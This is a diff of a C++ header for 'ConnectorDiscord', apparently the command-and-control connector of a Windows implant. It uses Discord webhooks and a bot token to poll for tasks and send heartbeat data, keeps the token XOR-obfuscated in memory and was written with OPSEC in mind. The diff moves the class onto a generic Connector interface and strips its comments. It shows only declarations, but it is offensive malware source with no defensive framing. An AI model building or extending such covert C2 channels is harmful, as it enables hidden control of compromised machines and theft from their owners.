@@ -2,7 +2,8 @@
 
 #include <windows.h>
 #include <wininet.h>
-#include "AgentConfig.h"  // ProfileDiscord defined here
+#include "AgentConfig.h"
+#include "Connector.h"
 
 #define DECL_API(x) decltype(x) * x
 
@@ -25,27 +26,22 @@ struct DISCORDFUNC {
 	DECL_API(InternetReadFile);
 };
 
-class ConnectorDiscord
+class ConnectorDiscord : public Connector
 {
-	// WinInet session (recreated per-request for OPSEC)
 	HINTERNET hSession;
 
-	// Discord API paths parsed from config
-	CHAR discordHost[128];   // "discord.com"
-	CHAR webhookPath[512];   // "/api/webhooks/xxx/yyy"
-	CHAR tasksPath[256];     // "/api/v10/channels/{id}/messages?limit=10"
-	CHAR authHeader[256];    // "Bot <token>"
+	CHAR discordHost[128];
+	CHAR webhookPath[512];
+	CHAR tasksPath[256];
+	CHAR authHeader[256];
 
-	// XOR key for bot_token in-memory obfuscation
 	BYTE tokenXorKey[32];
 	BYTE* tokenObf;
 	ULONG tokenObfLen;
 
-	// Response buffer
 	BYTE* recvData;
 	int   recvSize;
 
-	// Config
 	ProfileDiscord profile;
 	BYTE* beatData;
 	ULONG beatSize;
@@ -53,7 +49,6 @@ class ConnectorDiscord
 
 	DISCORDFUNC* functions;
 
-	// Helpers
 	BOOL  HttpsRequest(const CHAR* method, const CHAR* path, const CHAR* extraHeaders, BYTE* body, ULONG bodyLen, BYTE** outBuf, ULONG* outLen);
 	void  ParseWebhookUrl(const CHAR* url);
 	void  XorBuffer(BYTE* buf, ULONG len, BYTE* key, ULONG keyLen);
@@ -63,16 +58,18 @@ class ConnectorDiscord
 	void  DeobfuscateToken(CHAR* out, ULONG outSize);
 	void  PollTasks();
 
+	BOOL SetConfig(ProfileDiscord prof, BYTE* beat, ULONG bSize);
+	void SendData(BYTE* data, ULONG data_size);
+
 public:
 	ConnectorDiscord();
 
-	BOOL SetConfig(ProfileDiscord profile, BYTE* beat, ULONG beatSize);
-	void CloseConnector();
-
-	void  SendData(BYTE* data, ULONG data_size);
-	BYTE* RecvData();
-	int   RecvSize();
-	void  RecvClear();
+	BOOL SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize) override;
+	void Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey) override;
+	BYTE* RecvData() override;
+	int   RecvSize() override;
+	void  RecvClear() override;
+	void  CloseConnector() override;
 
 	static void* operator new(size_t sz);
 	static void operator delete(void* p) noexcept;
